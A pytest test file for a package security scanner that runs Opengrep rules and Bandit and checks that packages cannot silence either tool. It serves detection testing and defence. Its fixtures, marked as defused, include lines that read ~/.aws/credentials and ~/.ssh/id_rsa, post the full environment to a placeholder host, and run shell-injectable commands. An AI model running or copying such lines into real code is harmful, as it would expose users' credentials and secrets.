"""S2-1: code analysis (C01–C13) with Opengrep (own rules) and Bandit. The package can never
silence either tool."""

import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from luibui_scan.analyzers import AnalyzerRegistry, c_code
from luibui_scan.analyzers.c_code import KATALOG, CodeAnalyzer
from luibui_scan.context import ScanContext
from luibui_scan.inventory import build_inventory
from luibui_scan.models import Finding, Pruefumfang, ScanArt, Schwere
from luibui_scan.pipeline import run_pipeline
from luibui_scan.scoring import is_blocklisted
from luibui_scan.tools import ToolError, bandit, opengrep

REPO = Path(__file__).resolve().parents[3]
RULES = REPO / "rules"
OPENGREP = os.environ.get("LUIBUI_OPENGREP") or shutil.which("opengrep")
needs_opengrep = pytest.mark.skipif(
    not OPENGREP, reason="opengrep nicht installiert (lokal LUIBUI_OPENGREP setzen)"
)
MARK = "# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen\n"


def ctx_for(tmp_path: Path, files: dict[str, str]) -> ScanContext:
    root = tmp_path / "pkg"
    for rel, content in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(content)
    return ScanContext(
        root=root,
        scan_art=ScanArt.INTENSIV,
        pruefumfang=Pruefumfang.PAKET,
        inventory=build_inventory(root).entries,
    )


def rules(findings: list[Finding]) -> list[str]:
    return [f.rule_id for f in findings]


# --- rules/opengrep: every rule tested, and the tests pass -------------------------------------


def _rule_ids() -> list[str]:
    ids = []
    for path in sorted((RULES / "opengrep").glob("*.yaml")):
        ids += [r["id"] for r in yaml.safe_load(path.read_text("utf-8"))["rules"]]
    return ids


@pytest.mark.parametrize("rule_id", _rule_ids())
def test_every_opengrep_rule_has_a_positive_and_a_negative_case(rule_id: str) -> None:
    stem = re.sub(r"-(py|js|sh)$", "", rule_id)
    tests = "".join(
        p.read_text("utf-8") for p in (RULES / "opengrep").glob(f"{stem}.*") if p.suffix != ".yaml"
    )
    assert re.search(rf"ruleid: {re.escape(rule_id)}\b", tests)
    assert re.search(rf"ok: {re.escape(rule_id)}\b", tests)


def test_every_opengrep_rule_maps_to_a_catalog_check() -> None:
    for rule_id in _rule_ids():
        assert rule_id.split("-")[1] in KATALOG, rule_id


@needs_opengrep
def test_opengrep_rule_tests_pass() -> None:
    assert OPENGREP is not None
    proc = subprocess.run(  # noqa: S603 - fixed argv
        [OPENGREP, "scan", "--test", str(RULES / "opengrep")],
        env={**os.environ, "LANG": "C.UTF-8", "LC_ALL": "C.UTF-8", "PYTHONUTF8": "1"},
        capture_output=True,
        text=True,
        timeout=600,
        check=False,
    )
    assert proc.returncode == 0, proc.stdout[-3000:] + proc.stderr[-3000:]


# --- Bandit ---------------------------------------------------------------------------------------


def test_bandit_maps_shell_injection_to_c01(tmp_path: Path) -> None:
    code = MARK + (
        "import subprocess\n\ndef t(name):\n    subprocess.call('ls ' + name, shell=True)\n"
    )
    found = c_code._bandit(ctx_for(tmp_path, {"tool.py": code}))
    f = next(f for f in found if f.rule_id == "bandit:B602")
    assert f.schwere is Schwere.H and f.titel == KATALOG["C01"].titel
    assert f.datei == "tool.py" and f.zeile == 5


def test_bandit_cannot_be_silenced_by_the_package(tmp_path: Path) -> None:
    code = MARK + "import subprocess\nsubprocess.call(x, shell=True)  # nosec\n"
    files = {
        ".git/versteckt.py": code,
        "tests/t.py": MARK + "eval(x)\n",
        ".bandit": "[bandit]\nskips: B102,B307,B602\nexclude: tests,.git\n",
    }
    found = {(t.test_id, t.datei) for t in bandit.scan(ctx_for(tmp_path, files).root, RULES)}
    assert ("B602", ".git/versteckt.py") in found
    assert ("B307", "tests/t.py") in found


def test_bandit_noise_is_left_out(tmp_path: Path) -> None:
    code = MARK + "import subprocess\nassert True\nsubprocess.run(['git', 'status'])\n"
    assert c_code._bandit(ctx_for(tmp_path, {"t.py": code})) == []


@pytest.mark.parametrize(
    ("pruefung", "schwere", "sicherheit", "erwartet"),
    [
        ("C01", "HIGH", "HIGH", Schwere.H),
        ("C02", "MEDIUM", "HIGH", Schwere.M),
        ("C01", "HIGH", "LOW", Schwere.N),
        ("C11", "HIGH", "HIGH", Schwere.M),
        ("C13", "HIGH", "HIGH", Schwere.N),
    ],
)
def test_bandit_severity_is_capped_by_the_catalog(
    pruefung: str, schwere: str, sicherheit: str, erwartet: Schwere
) -> None:
    assert c_code._bandit_schwere(pruefung, schwere, sicherheit) is erwartet


# --- Opengrep ------------------------------------------------------------------------------------


@needs_opengrep
def test_opengrep_cannot_be_silenced_by_the_package(tmp_path: Path) -> None:
    line = 'import os\nk = open(os.path.expanduser("~/.aws/credentials")).read()  # nosem\n'
    files = {f"{d}/a.py": MARK + line for d in ("node_modules/x", "tests", ".versteckt", "dist")}
    files[".semgrepignore"] = "tests/\nnode_modules/\n.versteckt/\ndist/\n"
    files[".gitignore"] = files[".semgrepignore"]
    found = {t.datei for t in opengrep.scan(ctx_for(tmp_path, files).root, RULES)}
    assert found == {"node_modules/x/a.py", "tests/a.py", ".versteckt/a.py", "dist/a.py"}


@needs_opengrep
def test_blocklisted_code_locks_the_package(tmp_path: Path) -> None:
    code = MARK + 'import os\nk = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'
    found = CodeAnalyzer().analyze(ctx_for(tmp_path, {"sync.py": code}))
    f = next(f for f in found if f.rule_id == "LB-C04-zugangsdaten-lesen")
    assert f.schwere is Schwere.K and is_blocklisted(f)
    assert f.fix_prompt.startswith("Entferne in sync.py, Zeile 3")


@needs_opengrep
def test_evidence_masks_tokens(tmp_path: Path) -> None:
    token = "sk" + "A1b2C3d4" * 4
    code = MARK + (
        "import os, requests\n"
        f'requests.post("https://x.invalid", json=dict(os.environ), headers={{"k": "{token}"}})\n'
    )
    found = CodeAnalyzer().analyze(ctx_for(tmp_path, {"t.py": code}))
    f = next(f for f in found if f.rule_id == "LB-C06-umgebung-versendet")
    assert f.beleg is not None and token not in f.beleg and "skA1…" in f.beleg


def test_missing_opengrep_fails_the_analyzer(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("LUIBUI_OPENGREP", "")
    monkeypatch.setattr(shutil, "which", lambda _name: None)
    registry = AnalyzerRegistry()
    registry.add(CodeAnalyzer())
    result = run_pipeline(ctx_for(tmp_path, {"a.py": "x = 1\n"}), registry)
    assert result.ran == [] and [f.analyzer for f in result.failed] == ["c_code"]
    with pytest.raises(ToolError):
        opengrep.binary()


def test_quick_scan_has_no_code_analysis() -> None:
    assert ScanArt.SCHNELL not in CodeAnalyzer.info.scan_arts


@needs_opengrep
def test_opengrep_timeout_stops_the_whole_process_group(tmp_path: Path) -> None:
    ctx = ctx_for(tmp_path, {"a.py": "x = 1\n"})
    with pytest.raises(ToolError, match="Zeitlimit"):
        opengrep.scan(ctx.root, RULES, timeout=0.5)
    assert [p.name for p in ctx.root.parent.iterdir()] == ["pkg"]  # temporary HOME is gone
